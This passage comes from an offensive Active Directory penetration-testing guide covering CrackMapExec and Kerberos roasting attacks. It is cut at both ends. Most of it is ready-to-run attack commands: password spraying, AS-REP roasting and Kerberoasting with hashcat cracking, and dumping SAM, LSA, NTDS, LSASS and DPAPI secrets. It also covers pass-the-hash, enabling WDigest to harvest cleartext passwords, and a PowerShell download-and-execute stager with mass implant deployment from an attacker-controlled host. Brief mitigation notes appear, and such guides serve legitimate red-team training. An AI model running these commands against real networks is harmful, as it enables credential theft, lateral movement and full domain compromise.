crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' --computers

# Enumerate local groups on a host
crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' --local-groups

# Enumerate password policy
crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' --pass-pol

Combine --loggedon-users across a subnet to identify where high-value accounts (Domain Admins) have active sessions. This is useful for targeting lateral movement.

5.2.5 LDAP and RDP Enumeration

The LDAP protocol enables direct AD queries, while RDP validates remote desktop access.

# Enumerate users via LDAP
crackmapexec ldap dc01.corp.local -u jsmith -p 'Password1' --users

# Enumerate groups via LDAP
crackmapexec ldap dc01.corp.local -u jsmith -p 'Password1' --groups

# Enumerate computers via LDAP
crackmapexec ldap dc01.corp.local -u jsmith -p 'Password1' --computers

# Get domain SID
crackmapexec ldap dc01.corp.local -u jsmith -p 'Password1' --get-sid

# Find admin accounts via LDAP
crackmapexec ldap dc01.corp.local -u jsmith -p 'Password1' --admin-count

# Check RDP access
crackmapexec rdp 192.168.1.0/24 -u jsmith -p 'Password1'

# Check RDP with NLA bypass
crackmapexec rdp 192.168.1.10 -u jsmith -p 'Password1' --nla-screenshot

The LDAP protocol queries the domain controller directly and returns more comprehensive results than SMB-based enumeration. Use it for broad AD reconnaissance and leave SMB-based enumeration for host-specific tasks.

Methodology

  • Scan the subnet for live SMB hosts and identify signing status: 
    crackmapexec smb 192.168.1.0/24
  • Generate a relay target list from hosts with signing disabled: 
    crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
  • Attempt NULL session enumeration for shares and users: 
    crackmapexec smb 192.168.1.10 -u '' -p '' --shares
crackmapexec smb 192.168.1.10 -u '' -p '' --users
  • With valid credentials, spider shares for sensitive files: 
    crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' -M spider_plus
  • Enumerate logged-on users across the subnet to locate high-value sessions: 
    crackmapexec smb 192.168.1.0/24 -u jsmith -p 'Password1' --loggedon-users
  • Enumerate password policy, domain users, groups, and computers: 
    crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' --pass-pol
crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' --users
crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' --groups
  • Run LDAP queries against the DC for broader AD reconnaissance: 
    crackmapexec ldap dc01.corp.local -u jsmith -p 'Password1' --users
crackmapexec ldap dc01.corp.local -u jsmith -p 'Password1' --admin-count
crackmapexec ldap dc01.corp.local -u jsmith -p 'Password1' --get-sid
  • Validate RDP access across the subnet: 
    crackmapexec rdp 192.168.1.0/24 -u jsmith -p 'Password1'

5.3 Authentication Attacks

CME excels at password spraying across large environments. It validates credentials against SMB and reports which accounts authenticate successfully.

5.3.1 Password Spraying

CME excels at password spraying across large environments. It validates credentials against SMB and reports which accounts authenticate successfully.

# Spray a single password against a single user
crackmapexec smb 192.168.1.10 -u jsmith -p 'Welcome1!'

# Spray a single password against a user list
crackmapexec smb 192.168.1.10 -u users.txt -p 'Spring2024!'

# Spray multiple passwords against multiple users (one password per user, line by line)
crackmapexec smb 192.168.1.10 -u users.txt -p passwords.txt --no-bruteforce

# Spray one password against all users (bruteforce mode, all combinations)
crackmapexec smb 192.168.1.10 -u users.txt -p passwords.txt

# Continue spraying after finding a valid credential
crackmapexec smb 192.168.1.10 -u users.txt -p 'Password1' --continue-on-success

Output interpretation:

  • [+] with (Pwn3d!) means local admin on the target
  • [+] without (Pwn3d!) means valid credentials but not admin
  • [-] means failed authentication
  • STATUS_ACCOUNT_LOCKED_OUT means the account is locked; stop spraying immediately
# Spray against the domain controller to validate domain credentials
crackmapexec smb dc01.corp.local -u users.txt -p 'Summer2024!' -d CORP.LOCAL

# Use a different protocol for spraying
crackmapexec winrm 192.168.1.10 -u users.txt -p 'Welcome1!' -d CORP

5.3.2 Finding ASREPRoastable Accounts

CME can identify accounts with Kerberos pre-authentication disabled and extract their AS-REP hashes for offline cracking.

# Find ASREPRoastable accounts and extract hashes
crackmapexec ldap dc01.corp.local -u jsmith -p 'Password1' --asreproast asrep_hashes.txt

# Crack the extracted hashes with hashcat (mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

Accounts vulnerable to AS-REP roasting have the DONT_REQUIRE_PREAUTH UAC flag set. This is uncommon but appears in environments with legacy Kerberos integrations.

5.3.3 Finding Kerberoastable Accounts

CME can identify service accounts with SPNs registered and request their TGS tickets for offline cracking.

# Find Kerberoastable accounts and extract TGS hashes
crackmapexec ldap dc01.corp.local -u jsmith -p 'Password1' --kerberoasting kerb_hashes.txt

# Crack TGS hashes with hashcat
# RC4 encrypted tickets (mode 13100)
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt

# AES-256 encrypted tickets (mode 19700)
hashcat -m 19700 kerb_hashes.txt /usr/share/wordlists/rockyou.txt

Accounts with weak passwords and registered SPNs are high-value targets. Prioritize accounts in privileged groups such as Domain Admins, where a cracked ticket grants immediate domain compromise.

5.3.4 Stealing Hashes

With local administrator access, CME can dump credential material from the SAM database, LSA secrets, and the NTDS.dit file on domain controllers.

# Dump SAM hashes (local accounts)
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' --sam

# Dump LSA secrets (service account credentials, cached logons)
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' --lsa

# Dump NTDS.dit (all domain hashes, requires DA or equivalent on DC)
crackmapexec smb dc01.corp.local -u administrator -p 'AdminPass!' --ntds

# Dump NTDS using VSS method
crackmapexec smb dc01.corp.local -u administrator -p 'AdminPass!' --ntds vss
FlagSourceRequiresYields
--samSAM registry hiveLocal adminLocal account NTLM hashes
--lsaLSA secretsLocal adminService account passwords, DPAPI keys
--ntdsNTDS.ditDomain admin (on DC)All domain account NTLM hashes

5.3.5 Kerberos Authentication

CME supports Kerberos authentication via ccache files, enabling pass-the-ticket attacks and integration with tools like Impacket and Rubeus.

# Set the KRB5CCNAME environment variable to a ccache file
export KRB5CCNAME=/tmp/krb5cc_jsmith

# Authenticate with Kerberos ticket
crackmapexec smb dc01.corp.local -u jsmith --use-kcache

# Use the -k flag for Kerberos authentication with credentials
crackmapexec smb dc01.corp.local -u jsmith -p 'Password1' -k

# Combine Kerberos auth with enumeration
crackmapexec smb dc01.corp.local -u jsmith --use-kcache --shares

# Obtain a ccache with Impacket first
getTGT.py CORP/jsmith:'Password1' -dc-ip 192.168.1.10
export KRB5CCNAME=jsmith.ccache
crackmapexec smb dc01.corp.local --use-kcache --shares

Kerberos authentication avoids passing NTLM credentials over the network, which can bypass NTLM-based detection rules. It requires a valid ccache file and proper DNS resolution (the target must be specified by hostname, not IP).

Note: When using Kerberos authentication, always specify targets by their FQDN (e.g., dc01.corp.local), not by IP address. Kerberos requires proper hostname resolution to locate the SPN for the service ticket.

Methodology

  • Spray a single password against a user list and continue after hits: 
    crackmapexec smb 192.168.1.10 -u users.txt -p 'Spring2024!' --continue-on-success
  • Check output for [+] (Pwn3d!) (local admin) vs [+] (valid but not admin) and stop if STATUS_ACCOUNT_LOCKED_OUT appears
  • Extract AS-REP hashes for accounts with pre-auth disabled: 
    crackmapexec ldap dc01.corp.local -u jsmith -p 'Password1' --asreproast asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
  • Request TGS tickets for Kerberoastable service accounts: 
    crackmapexec ldap dc01.corp.local -u jsmith -p 'Password1' --kerberoasting kerb_hashes.txt
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
  • Dump SAM, LSA, and NTDS from targets with admin access: 
    crackmapexec smb 192.168.1.10 -u admin -p 'Password1' --sam
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' --lsa
crackmapexec smb dc01.corp.local -u administrator -p 'AdminPass!' --ntds
  • Authenticate using Kerberos tickets instead of NTLM: 
    export KRB5CCNAME=/tmp/krb5cc_jsmith
crackmapexec smb dc01.corp.local -u jsmith --use-kcache --shares

5.4 Command Execution and Secrets

Group Policy Preferences (GPP) historically stored passwords in an encrypted format on the SYSVOL share. Microsoft published the AES key used for this encryption, making all GPP passwords trivially recoverable.

5.4.1 Searching for Credentials in Group Policy Objects

Group Policy Preferences (GPP) historically stored passwords in an encrypted format on the SYSVOL share. Microsoft published the AES key used for this encryption, making all GPP passwords trivially recoverable.

# Search for GPP passwords in SYSVOL
crackmapexec smb dc01.corp.local -u jsmith -p 'Password1' -M gpp_password

# Search for GPP autologon credentials
crackmapexec smb dc01.corp.local -u jsmith -p 'Password1' -M gpp_autologin

The gpp_password module searches for Groups.xml, Services.xml, Scheduledtasks.xml, DataSources.xml, Printers.xml, and Drives.xml files containing the cpassword attribute. Despite Microsoft patching this in MS14-025, existing GPP files with passwords are not automatically removed.

5.4.2 Command Execution

CME supports several execution methods for running commands on remote hosts. Each method has different OPSEC implications and access requirements.

# Execute a command via cmd.exe
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -x "whoami /all"

# Execute a PowerShell command
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -X "Get-Process | Select-Object -First 5"

# Specify execution method
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -x "ipconfig" --exec-method smbexec
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -x "ipconfig" --exec-method wmiexec
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -x "ipconfig" --exec-method atexec
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -x "ipconfig" --exec-method mmcexec
MethodMechanismPortsOPSEC Notes
wmiexecWMI process creation135, dynamicSemi-interactive, low artifact footprint
smbexecCreates a Windows service445Creates and deletes a service; leaves service creation event (7045)
atexecScheduled task via AT445Creates a scheduled task; output written to temp file on target
mmcexecMMC DCOM object135, dynamicUses MMC20.Application DCOM; similar to wmiexec

5.4.3 Finding Secrets and Using Them

Beyond SAM, LSA, and NTDS dumping, CME supports DPAPI credential extraction and pass-the-hash authentication.

# Dump DPAPI credentials (browser passwords, Wi-Fi keys, saved credentials)
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -M dpapi_cred

# Use an NTLM hash instead of a password (pass the hash)
crackmapexec smb 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Use only the NT hash portion
crackmapexec smb 192.168.1.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Spray a hash against multiple hosts
crackmapexec smb 192.168.1.0/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth

# Dump LSASS via lsassy module (in-memory, no disk write)
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -M lsassy

# Dump LSASS with nanodump (stealthier)
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -M nanodump

When using -H for pass-the-hash, the format is LM:NT or just the NT hash. Modern Windows environments do not use LM hashes, so the LM portion can be set to aad3b435b51404eeaad3b435b51404ee (empty LM) or omitted entirely.

5.4.4 Getting Sessions in a C2 Framework

CME can execute payloads that establish sessions in a C2 framework like Sliver or Metasploit.

# Execute a Sliver implant via CME
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -x "\\\\10.10.14.5\\share\\implant.exe"

# Use PowerShell to download and execute
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -X "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/stager.ps1')"

# Use the web_delivery module (Metasploit integration)
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -M web_delivery -o URL=http://10.10.14.5:8080/payload

# Execute across multiple hosts for mass deployment
crackmapexec smb targets.txt -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x "\\\\10.10.14.5\\share\\beacon.exe"

For Sliver specifically, generate a shellcode or executable implant, host it on an SMB share or HTTP server, and use CME to trigger execution on target hosts.

Methodology

  • Search SYSVOL for GPP passwords and autologon credentials: 
    crackmapexec smb dc01.corp.local -u jsmith -p 'Password1' -M gpp_password
crackmapexec smb dc01.corp.local -u jsmith -p 'Password1' -M gpp_autologin
  • Execute commands remotely, choosing an exec method based on OPSEC needs: 
    crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -x "whoami /all" --exec-method wmiexec
  • Dump DPAPI credentials (browser passwords, saved credentials): 
    crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -M dpapi_cred
  • Pass the hash with a recovered NT hash: 
    crackmapexec smb 192.168.1.0/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth
  • Dump LSASS remotely using lsassy or nanodump modules: 
    crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -M lsassy
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -M nanodump
  • Deploy a Sliver implant via CME command execution: 
    crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -x "\\10.10.14.5\share\implant.exe"

5.5 Modules and Integration

CME has a modular architecture. Modules extend functionality for specific tasks like credential dumping, vulnerability scanning, and enumeration.

5.5.1 Working with Modules

CME has a modular architecture. Modules extend functionality for specific tasks like credential dumping, vulnerability scanning, and enumeration.

# List all available modules
crackmapexec smb -L

# List modules for a specific protocol
crackmapexec ldap -L

# Get information about a specific module
crackmapexec smb -M lsassy --options

# Run a module against a target
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -M lsassy

# Run a module with options
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -M met_inject -o LHOST=10.10.14.5 LPORT=4444

Modules are protocol-specific. An SMB module cannot be used with the LDAP protocol and vice versa. Use -L on each protocol to see its available modules.

5.5.2 BloodHound Integration

CME can mark compromised accounts as owned in BloodHound, which updates the attack path analysis in real time.

# Mark a user as owned in BloodHound
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -M bh_owned -o PASS=neo4jpassword

# Mark all hosts where you have admin as owned
crackmapexec smb 192.168.1.0/24 -u admin -p 'Password1' -M bh_owned -o PASS=neo4jpassword

# Specify BloodHound URI
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -M bh_owned -o URI=bolt://127.0.0.1:7687 USER=neo4j PASS=neo4jpassword

This integrates the enumeration and exploitation workflow directly with BloodHound. As you compromise credentials and validate local admin access, marking owned principals automatically reveals new shortest paths to high-value targets.

5.5.3 Popular Modules

The following modules are frequently used in AD assessments.

ModuleProtocolDescription
lsassySMBExtract credentials from LSASS memory remotely
nanodumpSMBDump LSASS using syscalls (stealthier than lsassy)
enum_avSMBEnumerate installed antivirus and EDR products
spider_plusSMBRecursively spider all readable shares
gpp_passwordSMBExtract GPP passwords from SYSVOL
petitpotamSMBTrigger PetitPotam authentication coercion
web_deliverySMBDeliver payloads from a web server
impersonateSMBList tokens available for impersonation
schtask_execSMBExecute commands via scheduled tasks
wdigestSMBEnable WDigest to capture cleartext credentials on next logon
 
# Enumerate AV and EDR products
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -M enum_av

# Enable WDigest for cleartext credential capture
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -M wdigest -o ACTION=enable

# Trigger PetitPotam coercion
crackmapexec smb dc01.corp.local -u jsmith -p 'Password1' -M petitpotam -o LISTENER=10.10.14.5

5.5.4 Vulnerability Scan Modules

CME includes modules for detecting well-known vulnerabilities without exploitation.

# Check for ZeroLogon (CVE-2020-1472)
crackmapexec smb dc01.corp.local -u '' -p '' -M zerologon

# Check for EternalBlue (MS17-010)
crackmapexec smb 192.168.1.0/24 -u '' -p '' -M ms17-010

# Check for PrintNightmare (CVE-2021-34527)
crackmapexec smb 192.168.1.0/24 -u jsmith -p 'Password1' -M printnightmare

# Check for NoPac / sAMAccountName spoofing (CVE-2021-42278 and CVE-2021-42287)
crackmapexec smb dc01.corp.local -u jsmith -p 'Password1' -M nopac

# Check for PetitPotam (unauthenticated)
crackmapexec smb dc01.corp.local -u '' -p '' -M petitpotam

These scan modules perform detection checks only. They send specific RPC requests and analyse responses to determine vulnerability status without modifying the target system.

5.5.5 Creating Custom CME Modules

CME modules are Python scripts placed in the modules directory. A minimal module implements the options and on_admin_login (or on_login) methods.

# Example: custom_enum.py
class CMEModule:
    name = 'custom_enum'
    description = 'Custom enumeration module'
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''Module options'''
        pass

    def on_admin_login(self, context, connection):
        '''Called when admin credentials are validated'''
        output = connection.execute('whoami /priv', True)
        context.log.success(f'Privileges: {output}')
# Place module in the CME modules directory
cp custom_enum.py ~/.cme/modules/

# For NetExec
cp custom_enum.py ~/.nxc/modules/

# Verify the module loads
crackmapexec smb -M custom_enum --options

The on_login method fires for any successful authentication; on_admin_login fires only when the user has local admin privileges (indicated by Pwn3d!).

Methodology

  • List available modules and review options for a target module: 
    crackmapexec smb -L
crackmapexec smb -M lsassy --options
  • Mark owned principals in BloodHound as you compromise credentials: 
    crackmapexec smb 192.168.1.0/24 -u admin -p 'Password1' -M bh_owned -o PASS=neo4jpassword
  • Enumerate AV and EDR products on target hosts: 
    crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -M enum_av
  • Scan for critical vulnerabilities (ZeroLogon, EternalBlue, PrintNightmare, NoPac): 
    crackmapexec smb dc01.corp.local -u '' -p '' -M zerologon
crackmapexec smb 192.168.1.0/24 -u '' -p '' -M ms17-010
crackmapexec smb dc01.corp.local -u jsmith -p 'Password1' -M nopac
  • Enable WDigest for cleartext credential capture on next logon: 
    crackmapexec smb 192.168.1.10 -u admin -p 'Password1' -M wdigest -o ACTION=enable
  • Deploy a custom module to the CME modules directory and verify it loads: 
    cp custom_enum.py ~/.cme/modules/
crackmapexec smb -M custom_enum --options

5.6 Advanced CME Usage

CME supports direct interaction with Microsoft SQL Server instances for enumeration, query execution, and command execution via xp_cmdshell.

5.6.1 MSSQL Enumeration and Attacks

CME supports direct interaction with Microsoft SQL Server instances for enumeration, query execution, and command execution via xp_cmdshell.

# Authenticate to MSSQL
crackmapexec mssql 192.168.1.20 -u sa -p 'SQLAdmin123!'

# Authenticate with Windows credentials
crackmapexec mssql 192.168.1.20 -u jsmith -p 'Password1' -d CORP

# Execute a SQL query
crackmapexec mssql 192.168.1.20 -u sa -p 'SQLAdmin123!' -q "SELECT name FROM sys.databases"

# Execute OS commands via xp_cmdshell
crackmapexec mssql 192.168.1.20 -u sa -p 'SQLAdmin123!' -x "whoami"

# Execute PowerShell commands
crackmapexec mssql 192.168.1.20 -u sa -p 'SQLAdmin123!' -X "Get-Process"
Note: xp_cmdshell is disabled by default on modern SQL Server installations. CME can enable it automatically if the authenticated user has sysadmin privileges, then disables it again after execution.

5.6.2 Proxychains with CME

When pivoting through a compromised host, CME can be tunneled through a SOCKS proxy to reach internal networks.

# Configure proxychains (edit /etc/proxychains4.conf)
# socks4  127.0.0.1 1080
# socks5  127.0.0.1 1080

# Run CME through a SOCKS proxy
proxychains crackmapexec smb 10.10.10.0/24

# Authenticate through the proxy
proxychains crackmapexec smb 10.10.10.50 -u jsmith -p 'Password1' -d CORP --shares

# Use with Sliver SOCKS proxy
# In Sliver: socks5 start
proxychains crackmapexec smb 10.10.10.0/24 -u jsmith -p 'Password1'

Performance through SOCKS proxies is significantly slower. Reduce the target scope as much as possible and avoid scanning large subnets through tunnels.

5.6.3 Additional CME Functionality

CME provides several flags for controlling behaviour, output, and authentication.

# Use local authentication instead of domain
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' --local-auth

# Specify a custom SMB port
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' --port 4455

# Set connection timeout
crackmapexec smb 192.168.1.0/24 -u jsmith -p 'Password1' --timeout 5

# Verbose output
crackmapexec smb 192.168.1.10 -u admin -p 'Password1' --verbose

# Export output to a file
crackmapexec smb 192.168.1.0/24 -u jsmith -p 'Password1' --shares --export shares.csv

# Log all output
crackmapexec smb 192.168.1.0/24 -u jsmith -p 'Password1' --log cme_output.log

# Set number of threads
crackmapexec smb 192.168.1.0/24 -u jsmith -p 'Password1' -t 20

The --local-auth flag is particularly useful for spraying local administrator credentials across subnets where the built-in Administrator account shares a common password.

5.6.4 Mastering the CMEDB

CME maintains a local database that stores discovered hosts, credentials, and shares across engagements. The cmedb tool provides an interactive interface for querying and managing this data.

# Launch the CME database interface
cmedb

# For NetExec
nxcdb

Key commands within the database shell:

# List workspaces
workspace list

# Create a new workspace
workspace create engagement_2024

# Switch workspace
workspace engagement_2024

# View stored credentials
creds

# View stored hosts
hosts

# View stored shares
shares

# Export credentials
export creds csv /tmp/creds.csv

# Search for specific credentials
creds -u administrator

# View hosts where a credential is admin
creds -id 1 --host

Workspaces isolate data per engagement. Create a dedicated workspace for each assessment to prevent data leakage between projects. The database is stored at ~/.cme/workspaces/ (or ~/.nxc/workspaces/ for NetExec).

CommandDescription
credsList all stored credentials (passwords and hashes)
creds addManually add a credential
creds removeDelete a stored credential
hostsList all discovered hosts
sharesList all enumerated shares
exportExport data to CSV or JSON
workspaceManage engagement workspaces

Methodology

  • Authenticate to MSSQL and execute queries or OS commands: 
    crackmapexec mssql 192.168.1.20 -u sa -p 'SQLAdmin123!' -q "SELECT name FROM sys.databases"
crackmapexec mssql 192.168.1.20 -u sa -p 'SQLAdmin123!' -x "whoami"
  • Tunnel CME through a Sliver SOCKS proxy to reach internal networks: 
    proxychains crackmapexec smb 10.10.10.0/24 -u jsmith -p 'Password1'
  • Spray local admin credentials across the subnet with local auth: 
    crackmapexec smb 192.168.1.0/24 -u admin -p 'Password1' --local-auth
  • Create a dedicated CMEDB workspace for the engagement: 
    cmedb
workspace create engagement_2024
workspace engagement_2024
  • Review stored credentials and identify hosts where a credential has admin access: 
    creds
creds -u administrator
creds -id 1 --host
  • Export collected data for reporting: 
    export creds csv /tmp/creds.csv

6. Kerberos Attacks

Kerberos is the default authentication protocol in Active Directory environments. It replaces NTLM with a ticket-based system built on symmetric key cryptography and a trusted third party (the Key Distribution Center). Understanding its internals is essential for identifying and exploiting misconfigurations in AD.

6.1 Kerberos Protocol Overview

Kerberos authentication involves three parties: the client, the service, and the Key Distribution Center (KDC). The KDC runs on every Domain Controller and consists of two logical components: the Authentication Service (AS) and the Ticket Granting Service (TGS).

Each principal (user or service) shares a long-term secret key with the KDC. For users, this key derives from their password hash. For services, it derives from the service account password hash or the computer account password hash.

The authentication flow has two main exchanges:

StepMessageDescription
1AS-REQClient sends username and a timestamp encrypted with their password hash (pre-authentication) to the KDC
2AS-REPKDC validates the timestamp, returns a Ticket Granting Ticket (TGT) encrypted with the krbtgt account hash, plus a session key
3TGS-REQClient presents the TGT and requests a service ticket for a specific SPN
4TGS-REPKDC issues a Service Ticket (TGS) encrypted with the target service account's password hash
5AP-REQClient presents the service ticket to the target service for authentication

The Privilege Attribute Certificate (PAC) is embedded in every Kerberos ticket. It contains the user's security identifier (SID), group memberships, and privileges. The target service reads the PAC to make authorization decisions. PAC validation against the KDC is optional and often skipped for performance, which enables several attack techniques.

Key Kerberos concepts:

  • Service Principal Name (SPN): a unique identifier that ties a service instance to a logon account (e.g., MSSQLSvc/db01.corp.local:1433)
  • Pre-authentication: proves the client knows the password before the KDC issues a TGT. Disabling it enables AS-REP Roasting
  • Ticket lifetime: TGTs default to 10 hours with a 7-day renewal window. Service tickets default to 10 hours
  • Encryption types: RC4 (0x17, uses NTLM hash), AES128 (0x11), AES256 (0x12). Modern environments prefer AES

6.2 Roasting Attacks

AS-REPRoasting targets accounts with Kerberos pre-authentication disabled (DONT_REQUIRE_PREAUTH UAC flag). When pre-auth is off, any principal can request a TGT for the target account and receive an AS-REP containing data encrypted with the account's password hash, which can be cracked offline.

6.2.1 AS-REPRoasting

AS-REPRoasting targets accounts with Kerberos pre-authentication disabled (DONT_REQUIRE_PREAUTH UAC flag). When pre-auth is off, any principal can request a TGT for the target account and receive an AS-REP containing data encrypted with the account's password hash, which can be cracked offline.

Overview

In a normal AS-REQ, the client proves knowledge of the password by encrypting a timestamp. If pre-authentication is disabled, the KDC skips this validation and returns an AS-REP containing:

  • A TGT (encrypted with the krbtgt hash, not useful for cracking)
  • An encrypted part containing the session key, encrypted with the target user's password-derived key

The encrypted part (etype 23 for RC4, or etype 17/18 for AES) can be extracted and cracked offline with hashcat or John the Ripper.

Enumeration

Find accounts with pre-authentication disabled:

# PowerView
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, userprincipalname

# AD PowerShell module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object Name, SamAccountName
# From Linux with ldapsearch
ldapsearch -x -H ldap://DC01.corp.local -D "user@corp.local" -w 'Password1' -b "DC=corp,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
Exploitation from Linux
# Impacket GetNPUsers.py - request AS-REP for all vulnerable users
GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.1

# With credentials - auto-discover vulnerable accounts
GetNPUsers.py corp.local/user:Password1 -request -format hashcat -outputfile asrep_hashes.txt

# Without credentials (if null session is allowed)
GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -format hashcat
Exploitation from Windows
# Rubeus - request AS-REP for all vulnerable accounts in the domain
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Target a specific user
.\Rubeus.exe asreproast /user:svc_backup /format:hashcat

# Force RC4 encryption for easier cracking
.\Rubeus.exe asreproast /user:svc_backup /format:hashcat /etype:RC4
Cracking
# Hashcat - AS-REP (RC4 / etype 23)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
Mitigation
  • Ensure Kerberos pre-authentication is enabled for all accounts
  • Audit accounts with the DONT_REQUIRE_PREAUTH flag: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
  • Enforce strong, long passwords on any accounts that must have pre-auth disabled (rare legacy requirement)
  • Monitor Event ID 4768 (TGT requested) with pre-auth type 0

6.2.2 Kerberoasting

Kerberoasting extracts service tickets (TGS) for accounts with registered SPNs. Since the service ticket is encrypted with the service account's password hash, it can be cracked offline. Any authenticated domain user can request a service ticket for any SPN, making this a low-privilege attack with potentially high impact.

How It Works

When a domain user sends a TGS-REQ for an SPN, the KDC returns a TGS-REP containing a service ticket encrypted with the target service account's secret key. The encryption type depends on the account's msDS-SupportedEncryptionTypes attribute:

  • RC4 (0x17): uses the NTLM hash directly. Fast to crack
  • AES256 (0x12): uses a key derived from the password with 4096 PBKDF2 iterations. Much slower to crack

Service accounts running under computer accounts are less interesting because their passwords are 120+ character random strings that are infeasible to crack. The primary targets are user accounts with SPNs set, especially those with weak passwords.

From Linux
# Impacket GetUserSPNs.py - enumerate and request all service tickets
GetUserSPNs.py corp.local/user:Password1 -dc-ip 10.10.10.1 -request -outputfile tgs_hashes.txt

# Request ticket for a specific SPN
GetUserSPNs.py corp.local/user:Password1 -dc-ip 10.10.10.1 -request-user svc_mssql

# Force RC4 encryption
GetUserSPNs.py corp.local/user:Password1 -dc-ip 10.10.10.1 -request -outputfile tgs_hashes.txt
From Windows (Rubeus and PowerView)
# Rubeus - kerberoast all accounts with SPNs
.\Rubeus.exe kerberoast /outfile:tgs_hashes.txt

# Target a specific user
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:tgs_hashes.txt

# Request RC4 encrypted tickets (downgrade)
.\Rubeus.exe kerberoast /tgtdeleg /outfile:tgs_hashes.txt

# PowerView - enumerate SPN accounts
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Request ticket with PowerShell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/db01.corp.local:1433"

# Extract tickets from memory with Mimikatz
kerberos::list /export
Targeted Kerberoasting

If you have GenericAll, GenericWrite, or WriteProperty on a user account, you can set an SPN on the account, kerberoast it, then remove the SPN. This extends Kerberoasting to accounts that do not normally have an SPN.

# Set an SPN on the target account
Set-DomainObject -Identity targetuser -SET @{serviceprincipalname='nonexistent/YOURSPN'}

# Kerberoast the target
.\Rubeus.exe kerberoast /user:targetuser /outfile:targeted.txt

# Clean up - remove the SPN
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
Encryption Downgrade

Rubeus can use the /tgtdeleg trick to request RC4-encrypted tickets even when the target account supports AES. This works by requesting a delegated TGT that is always RC4-encrypted, then using it to request service tickets. This only works from a domain-joined Windows host.

From Linux, GetUserSPNs.py does not support this trick; the encryption type depends on the target account's msDS-SupportedEncryptionTypes attribute.

Cracking
# Hashcat - TGS-REP (RC4 / etype 23)
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt

# Hashcat - TGS-REP (AES256 / etype 18)
hashcat -m 19700 tgs_hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt tgs_hashes.txt
Defense
  • Use Group Managed Service Accounts (gMSA) which have 120-character auto-rotated passwords
  • Enforce AES256 encryption for service accounts (msDS-SupportedEncryptionTypes = 24)
  • Set long, complex passwords (25+ characters) on service accounts with SPNs
  • Monitor Event ID 4769 (service ticket requested) with encryption type 0x17 (RC4)
  • Regularly audit accounts with SPNs: Get-ADUser -Filter {ServicePrincipalName -ne "$null"}

Methodology

  • Enumerate accounts with pre-auth disabled (AS-REPRoast targets): 
    Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, userprincipalname
  • AS-REPRoast from Linux with auto-discovery of vulnerable accounts: 
    GetNPUsers.py corp.local/user:Password1 -request -format hashcat -outputfile asrep_hashes.txt
  • AS-REPRoast from Windows with Rubeus: 
    .\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
  • Crack AS-REP hashes (hashcat mode 18200): 
